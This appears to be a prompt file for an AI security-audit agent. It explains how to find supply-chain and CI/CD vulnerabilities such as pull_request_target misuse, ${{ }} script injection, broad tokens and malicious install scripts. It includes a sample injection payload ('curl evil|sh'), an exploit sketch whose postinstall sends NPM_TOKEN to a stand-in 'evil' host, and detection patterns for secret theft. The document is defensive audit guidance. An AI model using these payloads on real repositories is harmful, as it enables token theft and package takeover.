<!--
FINDER PROMPT — supply-chain. You are a fresh-context auditor hunting ONE class:
Software Supply Chain & CI/CD Failures. Read the target's dependency manifests,
lockfiles, CI/CD workflows, and install scripts; emit finding objects. Signal
discipline (AGENTS.md) is binding: only a REACHABLE path from an untrusted origin
(a malicious PR/fork, a compromised/typosquatted dependency, an attacker-published
package version) to a dangerous sink (code execution in CI with secrets/write
token, code execution at install time, or a known-exploitable vuln in a code path
the app actually reaches) — with no effective guard — is a finding. Posture/process
items (missing SBOM, no SECURITY.md, no Dependabot, low maintainership, missing
pinning *as hygiene*) go to the Info appendix, NOT the body. No "upgrade everything"
churn, no CVEs in dev-only/unreached code reported as High, no dead workflows.
-->

# Finder — Software Supply Chain & CI/CD (`supply-chain`)

**Class key:** `supply-chain` · **OWASP:** A03:2025 (Software Supply Chain Failures) · **CWE:** CWE-1104 (use of unmaintained third-party components) / CWE-1357 (reliance on insufficiently trustworthy component) / CWE-829 (inclusion of functionality from untrusted control sphere) / CWE-506 (embedded malicious code) · **ASVS:** V15 (Secure Coding & Architecture — dependency & build integrity)

## 1. Objective

Find the path by which untrusted code or untrusted input enters the build/CI or the
shipped artifact and reaches a privileged sink: a dangerous workflow trigger that runs
attacker-controlled code with repo secrets / a write-scoped `GITHUB_TOKEN`, a `${{ }}`
expression injected into a shell, an over-broad token, an unpinned/typosquattable
dependency or Action, a malicious or attacker-overridable lifecycle/install script, or
a *known-exploitable* dependency CVE that the app's own code actually invokes. The bug
is a real CI-execution-with-secrets or install-time-RCE or reachable-vuln path — not the
mere absence of pinning, an SBOM, or a security policy.

## 2. Where to look

Four surfaces: (A) CI/CD workflow definitions, (B) dependency manifests + lockfiles,
(C) lifecycle/install/build scripts, (D) the integrity of how artifacts are fetched.

- **CI/CD workflows:** `.github/workflows/*.yml|*.yaml`, composite/reusable actions
  (`action.yml`), `.gitlab-ci.yml`, `Jenkinsfile`, `.circleci/config.yml`,
  `azure-pipelines.yml`, `.drone.yml`, `bitbucket-pipelines.yml`, Forgejo/Gitea
  `.forgejo/workflows/*`/`.gitea/workflows/*` (same `${{ }}` + action model as GHA),
  `Taskfile`/`Makefile`/`Rakefile` targets invoked by CI.
- **Dependency manifests + lockfiles** (presence of a lockfile is what makes a
  known-vuln/pinning claim checkable):
  - **Node/TS:** `package.json` (`dependencies`, `devDependencies`, `scripts`,
    `resolutions`/`overrides`), `package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`,
    `.npmrc`.
  - **Python:** `requirements*.txt`, `pyproject.toml` (`[project.dependencies]`,
    `[tool.poetry]`), `Pipfile`/`Pipfile.lock`, `poetry.lock`, `setup.py`/`setup.cfg`.
  - **Ruby:** `Gemfile`, `Gemfile.lock`, `*.gemspec`.
  - **Crystal:** `shard.yml`, `shard.lock` (git deps via `github:`/`git:` + `branch:`/
    `commit:`; a floating branch is unpinned).
  - **Go:** `go.mod`, `go.sum` (`replace` directives pointing at forks/local paths),
    `vendor/`.
  - **PHP:** `composer.json`, `composer.lock`.
  - **Java/Kotlin:** `pom.xml`, `build.gradle(.kts)`, `gradle/libs.versions.toml`,
    `settings.gradle` (custom/insecure repositories).
  - **Rust:** `Cargo.toml`, `Cargo.lock`, `[patch]`/`[replace]`, `build.rs`.
  - **.NET:** `*.csproj`, `packages.config`, `nuget.config` (insecure feeds).
- **Lifecycle / install / build scripts** (run at `install`/build time with whatever
  privileges the developer/CI has):
  - npm/yarn/pnpm lifecycle: `preinstall`, `install`, `postinstall`, `prepare`,
    `prepublish`, `prepublishOnly` in `package.json` `scripts`; `node-gyp`/binary
    download hooks; `.npmrc` `ignore-scripts=false`.
  - Python: `setup.py` arbitrary code at install, `pyproject.toml` build backends,
    `cffi`/`build_ext` custom commands, `conftest.py` auto-loaded by pytest in CI.
  - Ruby: `*.gemspec` `extensions` / `ext/extconf.rb` native build; `Rakefile`
    auto-run tasks.
  - Rust: `build.rs` (runs arbitrary code at build), proc-macro crates.
  - Go: `//go:generate`, cgo, `go:embed` of fetched content.
  - Make/CMake/Gradle init scripts, `Dockerfile` `RUN curl ... | sh`.
- **Artifact-fetch integrity:** `Dockerfile`/`docker-compose` base images by mutable
  tag (`:latest`) vs digest; `RUN curl|wget ... | sh|bash`; downloads over plain
  `http://`; `go install pkg@latest`, `pip install` from a git URL/branch,
  `gem "x", git: ...` on a branch, `cargo install` from git; custom/insecure package
  registries (`--index-url`, `source` blocks, `nuget.config` HTTP feeds).

Grep signals (workflows): `pull_request_target`, `workflow_run`, `issue_comment`,
`pull_request_review_comment`, `actions/checkout` with `ref:`/`head.sha`/`head.ref`,
`${{ github.event.` (esp. `.pull_request.title`/`.body`/`.head.ref`/`.comment.body`/
`issue.title`), `run:` blocks containing `${{`, `permissions:`, `write-all`,
`contents: write`, `id-token: write`, `pull-requests: write`, `secrets:`,
`GITHUB_TOKEN`, `uses: .*@(main|master|v?\d+)$` (tag/branch, not 40-hex SHA),
`uses: ./` self-host, `actions/github-script`, `tj-actions/`, `curl|sh`, `pull_request`
with `secrets`. Manifests: version specifiers `^`/`~`/`*`/`latest`/`>=`/`branch:`,
git URLs, `overrides`/`resolutions`, `replace`/`[patch]`, missing lockfile. Scripts:
`postinstall`, `preinstall`, `prepare`, `build.rs`, `extconf.rb`, `setup.py`.

## 3. Detection heuristics

This class has three distinct taint shapes — frame every finding around which one.

**Shape A — Dangerous CI/CD workflow (untrusted PR/event → code exec with secrets).**
- **SOURCE** = an event a non-collaborator can trigger that runs in a *privileged*
  context: `pull_request_target`, `workflow_run` (chained off a fork PR),
  `issue_comment`, `pull_request_review_comment`, `discussion*`, or a scheduled/`push`
  job that consumes PR-controlled state. Plus the attacker-controlled fields inside
  the event: PR head `ref`/`sha`/branch name, PR title/body, comment body, issue
  title, label/branch names.
- **SINK** = (1) checking out and executing the fork's untrusted code (`actions/checkout`
  with `ref: ${{ github.event.pull_request.head.sha|head.ref }}` followed by `npm
  install`/`make`/`./script`/test that runs repo code) *in a job that holds secrets or
  a write token*; or (2) a `${{ <attacker field> }}` expression interpolated directly
  into a `run:` shell (script injection) / into `actions/github-script` JS.
- Vulnerable patterns to confirm:
  - **`pull_request_target` + untrusted checkout:** `on: pull_request_target` (runs with
    the *base* repo's secrets and a read/write token) that does
    `uses: actions/checkout@... with: ref: ${{ github.event.pull_request.head.ref }}`
    then builds/tests/installs — the fork's code (incl. its `package.json`
    `postinstall`, its build scripts) executes with access to `secrets.*` and
    `GITHUB_TOKEN`. Same trap via `workflow_run` triggered by the fork's
    `pull_request` workflow, then checking out / downloading the fork's artifact.
  - **`${{ }}` script injection:** any attacker-controlled event field interpolated
    into `run:`/`script:`/`github-script`. Canonical:
    `run: echo "${{ github.event.pull_request.title }}"` — a PR title of
    `"; curl evil|sh #` breaks out of the shell string and runs in CI. Likewise
    `${{ github.event.issue.title }}`, `${{ github.head_ref }}` (branch name with
    backticks/`$()`), `${{ github.event.comment.body }}`,
    `${{ github.event.review.body }}`. The expansion happens *before* the shell sees
    it, so shell quoting in the YAML does not save you.
  - **Self-hosted runner on public-repo fork PRs:** fork PRs landing on a
    self-hosted runner = arbitrary code on your infra.
- **GitLab/others:** `rules`/`only` that run on merge-request pipelines from forks with
  protected variables exposed; `Jenkinsfile` building untrusted PR branches with
  credentials bound; CircleCI `pr-comment`-triggered jobs.

**Shape B — Over-broad / leaked CI permissions (amplifies A, or is the bug itself).**
- **SINK** = a `GITHUB_TOKEN` with more scope than the job needs, reachable by attacker
  code from Shape A or by a compromised dependency running in the job:
  - No top-level `permissions:` block (default is often `write-all`/broad on older
    repos), or `permissions: write-all`, or `contents: write` / `packages: write` /
    `id-token: write` (OIDC cloud creds) / `pull-requests: write` /
    `actions: write` granted to a job that also runs untrusted/third-party code.
  - Secrets (`secrets.*`, cloud keys, npm publish token) exposed as `env:` in a job
    that checks out or executes untrusted PR code or an unpinned third-party action.
  - A reusable/third-party action receiving `secrets: inherit`.
- This is only a *finding* when the broad token/secret is reachable by code an attacker
  controls (a fork checkout, a `${{}}` injection, or an unpinned mutable action that
  could be swapped) — not merely "scope is wider than ideal" with no untrusted code in
  the job. Tie it to a concrete reach path.

**Shape C — Untrusted/compromisable component reaches build or runtime.**
- **SOURCE** = a package/Action/image the project pulls whose *content can change under
  an attacker* (mutable ref, registry takeover, typosquat, dependency confusion) or is
  *already known-exploitable*.
- **SINK** = code execution at install/build time, or invocation of a vulnerable API in
  a reachable code path.
- Vulnerable patterns to confirm:
  - **Unpinned GitHub Action (mutable ref):** `uses: some/action@v3` or `@main` — tags
    and branches are movable; a compromised maintainer or tag re-point runs new code in
    your pipeline with your token/secrets. The famous `tj-actions/changed-files`
    incident is exactly this. *Pinned* = full 40-char commit SHA. Self-`uses: ./local`
    is fine (in-repo).
  - **Malicious / dangerous lifecycle script (CWE-506):** a `postinstall`/`preinstall`/
    `prepare` (npm), `build.rs` (Rust), `setup.py` install hook, gemspec `extensions`,
    or `Makefile`/`Dockerfile` `RUN curl ... | sh` that exfiltrates env/secrets, phones
    home, downloads+executes remote code, or runs obfuscated payloads. Read the actual
    script: look for `curl`/`wget`/`fetch` piped to a shell or `eval`, base64/hex
    blobs, `child_process`/`os.system`/`exec` touching `process.env`/`~/.npmrc`/
    `~/.aws`, network calls to odd hosts. (A first-party build hook that only compiles
    local source is NOT this.)
  - **Known-vulnerable dependency, reachable (CWE-1104/1357):** a pinned version in a
    lockfile that an OSV/GHSA query flags as vulnerable AND the vulnerable function is
    invoked by the app's own code on a path that can receive untrusted input. E.g. a
    `lodash` prototype-pollution CVE where the app calls `_.merge(req.body, ...)`; a
    `log4j`/`Log4Shell` (`CVE-2021-44228`) version with user-controlled log strings; a
    `Pillow`/`libxml`/`marshmallow`/`urllib3`/`requests` advisory whose vulnerable code
    path the app exercises. Use the lockfile's exact version, the advisory's affected
    range, and a real call site. (A CVE in a transitive dep that the app never reaches,
    or a dev-only tool, is at most Low/Info — see §4.)
  - **Typosquat / dependency confusion (CWE-829):** a dependency name that shadows an
    internal/private package (no scope, public registry resolves it) or is one keystroke
    off a popular package (`lodahs`, `crossenv`, `python-dateutil` vs `dateutil`).
    Confirm the name is suspect AND the registry/resolution actually pulls the public/
    attacker copy.
  - **Insecure fetch / mutable base image:** `Dockerfile FROM node:latest` (mutable) or
    a base by tag with no digest; `RUN curl http://... | sh` (plaintext + execute);
    `pip install` / `go install ...@latest` / `gem ... git:` on a moving branch; a
    package source over `http://` or an untrusted custom registry without integrity.

## 4. Not-a-finding (false-positive guard) — check BEFORE flagging

Do NOT report if any of these holds:

- **The workflow trigger runs only trusted code / can't reach secrets.** Plain
  `on: pull_request` (NOT `_target`) from a fork runs with a *read-only* `GITHUB_TOKEN`
  and **no** repo secrets by default — executing fork code there is the intended,
  unprivileged path; it is not a finding unless secrets are explicitly injected or it's
  on a self-hosted runner. A `pull_request_target` job that checks out the *base* repo
  (default `ref`, or `ref: ${{ github.sha }}`/`github.event.pull_request.base.sha`) and
  never runs fork code is safe — verify the `ref:`.
- **`${{ }}` value is trusted or safely passed.** The expression references a non-attacker
  field (`github.sha`, `github.repository`, `secrets.*`, `github.run_id`, a `vars.*`
  set by maintainers) — no injection. OR the attacker field is passed via an intermediate
  `env:` var and the shell references `"$ENVVAR"` (quoted) — that is the documented safe
  pattern; the dangerous form is direct `${{ }}` *inside* the `run:` string. OR it's used
  in a context that isn't a shell/JS sink (e.g. `if:` comparison, a `with:` input to an
  action that treats it as data). Confirm the field is attacker-controlled AND lands in a
  shell/`eval`/`script` sink un-indirected.
- **Token scope is already least-privilege for the work in the job, or no untrusted code
  shares the job.** A top-level `permissions: read-all`/`contents: read`, or per-job
  `permissions:` granting only what that job needs, is correct — don't flag width that
  matches the task. `contents: write` on a release job that runs only first-party pinned
  steps is fine. The finding requires untrusted/swappable code co-resident with the broad
  token.
- **Action / dependency is effectively pinned or integrity-checked.** Action pinned to a
  full 40-hex commit SHA (`@a1b2c3...`); dependency pinned to an exact version with a
  committed lockfile and integrity hashes (`package-lock.json` `integrity:`,
  `Cargo.lock`, `go.sum`, `Gemfile.lock`, `pnpm-lock` with `--frozen-lockfile` in CI);
  Docker base by `@sha256:` digest. A `^`/`~` range in `package.json` is *resolved and
  locked* by the committed lockfile — that's acceptable; flag unpinned only when there's
  no lockfile, or CI installs without `--frozen-lockfile`/`npm ci`, or the ref is truly
  mutable (branch/`latest`/tag-only Action). Range-without-lockfile or a re-resolving
  install IS a finding.
- **Lifecycle script is first-party and benign.** A `postinstall` that compiles the
  project's own native addon, runs `husky install`, or builds local TypeScript — reads no
  secrets, fetches no remote code, no obfuscation. `build.rs`/`extconf.rb` that only
  compiles vendored/local source. Read it and confirm it does nothing network/exec on
  untrusted input. (`ignore-scripts=true` in `.npmrc` also neutralizes third-party
  install scripts — note it as a mitigation.)
- **Vulnerable dependency is unreachable, dev-only, or already patched.** The CVE's
  vulnerable function is never called by app code, or only by a `devDependencies` /
  test / build tool not shipped or not exposed to untrusted input; OR the locked version
  is *outside* the advisory's affected range (read the range precisely — off-by-one here
  is the #1 false positive); OR an `overrides`/`resolutions`/`[patch]`/`replace` already
  forces a fixed version. A version that merely "could be newer" with no advisory and no
  sink is NOT a finding — that's hygiene → Info appendix.
- **Posture/process, not an exploit path.** Missing SBOM, no `SECURITY.md`, no
  Dependabot/Renovate, no signed commits, low maintainer count, missing branch
  protection *as a standalone observation* → Info appendix per AGENTS.md, never the body.
  (OSSF Scorecard hygiene checks belong here; only its code-exploitable checks —
  Dangerous-Workflow, Token-Permissions, Pinned-Dependencies *with a reach path*,
  reachable Vulnerabilities — are body findings.)
- **The workflow/manifest is dead or not in the default branch.** A disabled/orphaned
  workflow, a fixture, or one not triggered by any reachable event.

If a "mitigation" is bypassable — a `pull_request_target` that *claims* to check out base
but a later step re-checks-out the head; an `env:`-indirection that is still expanded into
a shell via `${{}}`; a lockfile present but CI runs `npm install` (re-resolves) instead of
`npm ci`; an `overrides` that pins the direct dep but the vuln is reached transitively
elsewhere; an Action "pinned" to a tag a third party can move — it is NOT a mitigation.
Flag it and name the exact bypass in `sanitizers_checked`.

## 5. Severity guidance

- **Critical** — unauthenticated/any-fork attacker → arbitrary code execution in CI with
  access to **production-impacting secrets or a write/publish token or OIDC cloud creds**:
  `pull_request_target` (or `workflow_run`) checking out and executing fork code in a job
  holding `secrets.NPM_TOKEN`/cloud keys/`id-token: write`; `${{ }}` script injection in
  such a job; a malicious `postinstall` in a shipped/CI-run dependency that exfiltrates
  those secrets; a remotely-exploitable known-vuln dep (e.g. Log4Shell) reachable with
  untrusted input on a network-facing path. Also: a swappable third-party Action in a
  job with a publish token (effective supply-chain RCE).
- **High** — code execution in CI with a write-scoped `GITHUB_TOKEN` but no high-value
  external secret (still allows tampering with the repo / releases / pushing commits);
  script injection / untrusted checkout in a job with `contents: write` but no cloud
  creds; an unpinned mutable Action co-resident with a write token; a known-exploitable
  reachable dep CVE requiring authentication or non-default conditions; dependency
  confusion/typosquat that resolves to a public name shadowing an internal package.
- **Medium** — over-broad token reachable only under narrower conditions; unpinned Action
  in a read-only job (tampering limited); a reachable dep vuln of moderate impact
  (limited DoS, info leak) or one needing unusual config; mutable base image / `curl|sh`
  fetch with no signature where the source is reputable-but-unverified.
- **Low/Info** — unpinned dependency/Action with **no** reachable secret or untrusted-code
  co-residency (pure pinning hygiene), a CVE in an unreached/dev-only dep, plaintext
  `http://` fetch of non-executable data, "could upgrade" without an advisory. Pure
  posture (no SBOM/SECURITY.md/Dependabot, maintainership) → **Info appendix only**.

## 6. Emit findings as

One JSON object per distinct root cause (dedup; e.g. one finding for "all jobs lack a
`permissions:` block" listing the files in `rationale`, not one per job). Fields:

```json
{
  "id": "supply-chain-001",
  "title": "pull_request_target checks out & builds fork code with NPM_TOKEN in scope",
  "vuln_class": "supply-chain",
  "owasp": "A03:2025",
  "cwe": "CWE-829",
  "asvs": "V15",
  "severity": "critical",
  "status": "likely",
  "confidence": "high",
  "file": ".github/workflows/pr-build.yml",
  "line": 7,
  "end_line": 24,
  "code_excerpt": "on:\n  pull_request_target:\n...\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n      - run: npm ci && npm test\n        env:\n          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}",
  "source": "Any GitHub user opens a PR from a fork; pull_request_target runs in the BASE repo's privileged context (repo secrets + read/write GITHUB_TOKEN). Attacker controls the checked-out head.sha (their fork's code, incl. its package.json postinstall).",
  "sink": "actions/checkout of head.sha then `npm ci`/`npm test` executes the fork's arbitrary code (lifecycle scripts + test code) in a job where secrets.NPM_TOKEN and GITHUB_TOKEN are present.",
  "data_flow": "fork PR -> pull_request_target trigger (privileged) -> checkout ref: head.sha (untrusted) -> npm ci runs fork's postinstall + test runs fork's code -> code reads process.env.NPM_TOKEN / GITHUB_TOKEN and exfiltrates. No guard between checkout-of-head and secret-bearing run.",
  "sanitizers_checked": "trigger is pull_request_target (privileged), NOT plain pull_request; checkout ref is head.sha (untrusted fork), NOT base.sha; no `if:` gating to trusted authors / labels-after-review; secrets explicitly injected as env in the same job; no `permissions:` narrowing (token is read/write); not a self-`./` action.",
  "rationale": "Textbook dangerous-workflow: privileged trigger + untrusted checkout + secrets in job = full secret exfiltration / npm package takeover by any anonymous PR author. Same pattern also in .github/workflows/label.yml:12.",
  "exploit_sketch": "Fork the repo; add to package.json: \"postinstall\":\"node -e 'require(\\\"https\\\").get(`https://evil/?t=`+process.env.NPM_TOKEN)'\"; open a PR. The pull_request_target job checks out my fork at head.sha and runs npm ci, executing postinstall with NPM_TOKEN in env — token exfiltrated; I publish a malicious version of the package.",
  "dynamic_poc_plan": "On an isolated fork of the repo wired to a throwaway runner with a dummy SECRET, open a PR whose package.json postinstall writes process.env to the job log (or curls a local listener). Observe the workflow run executing the fork's postinstall and the dummy secret value appearing in the captured output — proving fork code runs with secret access. Never exfiltrate a real token off-box.",
  "proposed_fix": "Untrusted fork code must never execute in a context that holds repo secrets or a write token: keep building/testing fork code on the unprivileged trigger and ensure any secret-bearing step only ever runs first-party base code. Direction only — the exact split/gating/permissions changes are for the engineer who picks this up; this is a high-level direction, not a patch."
}
```

Accuracy bar: `source`, `sink`, `data_flow`, `sanitizers_checked` must be concrete and
true. `source` = the untrusted origin (which fork/PR/event field, which attacker-publishable
package, which mutable ref). `sink` = the precise dangerous op (the checkout+run that
executes untrusted code, the `${{}}`-in-shell, the install-time `exec`, the call site of
the vulnerable API). `data_flow` = how the untrusted thing reaches the sink and why no
guard stops it (name the trigger, the `ref:`, the token scope, the lockfile/pinning state).
`sanitizers_checked` = the §4 FP guard made explicit — confirm the trigger is privileged
(not plain `pull_request`), the checkout is head-not-base, the `${{}}` is direct-not-
env-indirected, the Action is tag-not-SHA, the lockfile is absent / CI re-resolves, the
CVE version is *inside* the affected range and the function is reached — and state each as
absent or name the bypass. Pick `cwe` by shape: 829 untrusted checkout / dependency
confusion / external-code inclusion, 506 embedded malicious lifecycle script, 1104
unmaintained/known-vuln component, 1357 insufficiently-trustworthy component (mutable
Action/image, typosquat). Use `status:"likely"` for a proven static trace (privileged
trigger + untrusted reach, or locked-vuln-version + reachable call site), `"confirmed"`
only after dynamic repro, `"triage"` if reachability/privilege/version-range is uncertain
(e.g. can't confirm the CVE function is called, or unsure the runner is self-hosted).

## 7. Dynamic PoC strategy

Goal: prove the *running* pipeline or build executes untrusted code with the claimed
privilege, or that a vulnerable dependency is actually reachable. Work only against an
isolated copy/fork wired to a throwaway runner and **dummy** secrets — never exfiltrate a
real token or mutate a real registry/account.

- **Dangerous workflow (Shape A).** Clone the repo into an isolated fork with a
  self-hosted/ephemeral runner and a placeholder secret (`SECRET=poc-canary-<nonce>`).
  Trigger the workflow the attacker's way: open a PR from a fork whose `package.json`
  `postinstall` (or whatever the job runs) echoes `process.env`/`$SECRET` to the job log
  or to a local listener. **Proof:** the workflow run shows the fork's code executing and
  the canary secret value appearing in the captured log / listener — fork code ran with
  secret access. For self-hosted-runner exposure, show a benign `id`/`hostname` command
  from fork code running on your infra.
- **`${{ }}` script injection.** Open a PR / comment whose injected field carries a benign
  command, e.g. PR title `` x"; echo INJECTED-<nonce> > $GITHUB_WORKSPACE/poc; # `` (or a
  branch name with `$(echo INJECTED)`). **Proof:** the job log shows `INJECTED-<nonce>` /
  the `poc` file exists — the title broke out of the shell string and executed. Keep the
  payload to a harmless marker.
- **Over-broad token (Shape B).** Within the above fork-code execution, use the
  `GITHUB_TOKEN` to perform a write the job shouldn't need on the *throwaway* repo (e.g.
  create a benign issue/label via the API, or push a no-op commit to a scratch branch).
  **Proof:** the API call returns 2xx — the token is write-scoped and reachable by
  untrusted code. Revert the change.
- **Malicious / dangerous lifecycle script (Shape C).** In an isolated container, run the
  install with scripts enabled (`npm ci` / `cargo build` / `pip install .`) under an
  egress monitor (`strace -f -e trace=network`, a sinkhole DNS, or a local capture
  proxy). **Proof:** the script makes an unexpected outbound connection, reads
  `process.env`/`~/.npmrc`/`~/.aws`, or decodes+executes a remote/obfuscated payload —
  captured in the trace. Compare against `--ignore-scripts` to confirm the script is the
  vector.
- **Unpinned mutable Action / base image.** Demonstrate mutability: show the `@v3`/`@main`
  ref resolves to a SHA you do not control and that re-pointing the tag/branch (or a
  registry-side re-push for a `:latest` image) would change what runs — in the isolated
  fork, point the `uses:` at a fork-controlled copy of the action at the same tag and
  show your code runs in the pipeline. **Proof:** attacker-controlled action code executes
  with the job's token.
- **Known-vulnerable dependency (reachable).** Confirm the locked version is in the
  advisory's affected range (`npm ls <pkg>`/`pip show`/`bundle list`/`go list -m`), then
  boot the app and send the vuln's trigger to the reachable endpoint (e.g. a
  prototype-pollution body to the route that calls `_.merge(req.body,…)`; a JNDI lookup
  string to a field that gets logged by the vulnerable log4j). **Proof:** observe the
  vulnerability's effect (polluted property changing app behavior, the OOB JNDI/HTTP
  callback firing, the crash/leak the CVE describes) — proving the dep is both vulnerable
  *and* reached. Use a benign OOB nonce, never a real exploit payload.

Record the exact trigger/command and observed evidence in the `Repro` object
(`reproduced`, `method:"live-exploit"`, `poc`, `observed`, `impact`). The workflow run
executing fork code with a dummy secret in the log, the injected marker appearing, the
token write succeeding, the install-time egress capture, or the dep's effect firing on a
live route each prove the class — set `method:"live-exploit"`. If a runner/registry/app
can't be stood up, fall back to a static trace (privileged trigger + untrusted `ref:` and
in-scope secrets; or locked-affected-version + a concrete reachable call site) and set
`method:"static-poc"`, `status:"likely"`, noting the gap. NEVER exfiltrate real secrets,
publish to a real registry, or run a real exploit against third-party infrastructure to
prove a finding — a dummy-secret/benign-marker repro is sufficient and required.
